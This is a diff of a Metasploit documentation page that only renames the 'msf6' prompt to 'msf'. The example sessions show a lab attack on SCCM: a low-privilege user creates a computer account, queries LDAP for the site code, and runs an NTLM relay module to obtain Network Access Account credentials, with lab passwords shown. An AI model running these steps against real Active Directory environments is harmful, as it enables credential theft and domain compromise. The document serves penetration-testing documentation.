@@ -64,7 +64,7 @@ In the following example the user `ssccm.lab\eve` is a low-privilege user.
 ### Creating computer account
 
 ```
-msf6 auxiliary(admin/dcerpc/samr_account) > run rhost=192.168.33.10 domain=sccm.lab username=eve password=iloveyou
+msf auxiliary(admin/dcerpc/samr_account) > run rhost=192.168.33.10 domain=sccm.lab username=eve password=iloveyou
 [*] Running module against 192.168.33.10
 
 [*] 192.168.33.10:445 - Adding computer
@@ -77,7 +77,7 @@ msf6 auxiliary(admin/dcerpc/samr_account) > run rhost=192.168.33.10 domain=sccm.
 ### Manual discovery of SITE_CODE and MANAGEMENT_POINT using domain credentials
 
 ```
-msf6 auxiliary(gather/ldap_query) > run domain=sccm.lab rhosts=192.168.56.10 username=eve password=iloveyou action=RUN_SINGLE_QUERY QUERY_FILTER=(objectclass=mssmsmanagementpoint) QUERY_ATTRIBUTES=cn,dnshostname,mssmssitecode
+msf auxiliary(gather/ldap_query) > run domain=sccm.lab rhosts=192.168.56.10 username=eve password=iloveyou action=RUN_SINGLE_QUERY QUERY_FILTER=(objectclass=mssmsmanagementpoint) QUERY_ATTRIBUTES=cn,dnshostname,mssmssitecode
 [*] Running module against 192.168.56.10
 [*] 192.168.56.10:389 Discovered base DN: DC=sccm,DC=lab
 [*] Sending single query (objectclass=mssmsmanagementpoint) to the LDAP server...
@@ -102,7 +102,7 @@ net use \\192.168.56.1\foo /u:SCCM.LAB\DESKTOP-5FJM1832$ JpnYZ43YHqmoOLj9xBKdI9t
 
 ### Running the module
 ```
-msf6 exploit(windows/local/cve_2024_35250_ks_driver) > msf6 exploit(windows/local/cve_2024_35250_ks_driver) > use relay_get
+msf exploit(windows/local/cve_2024_35250_ks_driver) > msf exploit(windows/local/cve_2024_35250_ks_driver) > use relay_get
 
 Matching Modules
 ================
@@ -116,13 +116,13 @@ Interact with a module by name or index. For example info 0, use 0 or use auxili
 
 [*] Using auxiliary/server/relay/relay_get_naa_credentials
 [*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
-msf6 auxiliary(server/relay/relay_get_naa_credentials) >  dns add-static mecm.sccm.lab 192.168.56.11
+msf auxiliary(server/relay/relay_get_naa_credentials) >  dns add-static mecm.sccm.lab 192.168.56.11
 [*] Added static hostname mapping mecm.sccm.lab to 192.168.56.11
-msf6 auxiliary(server/relay/relay_get_naa_credentials) > run rhost=192.168.56.11 smbdomain=sccm.lab MANAGEMENT_POINT=MECM.sccm.lab SITE_CODE=P01
+msf auxiliary(server/relay/relay_get_naa_credentials) > run rhost=192.168.56.11 smbdomain=sccm.lab MANAGEMENT_POINT=MECM.sccm.lab SITE_CODE=P01
 [*] Auxiliary module running as background job 0.
 
 [*] Checking endpoint on http://192.168.56.11:80/ccm_system_windowsauth/request
-msf6 auxiliary(server/relay/relay_get_naa_credentials) > [*] SMB Server is running. Listening on 0.0.0.0:445
+msf auxiliary(server/relay/relay_get_naa_credentials) > [*] SMB Server is running. Listening on 0.0.0.0:445
 [*] Server started.
 [*] New request from 192.168.56.1
 [*] Received request for SCCM.LAB\DESKTOP-5FJM1832$
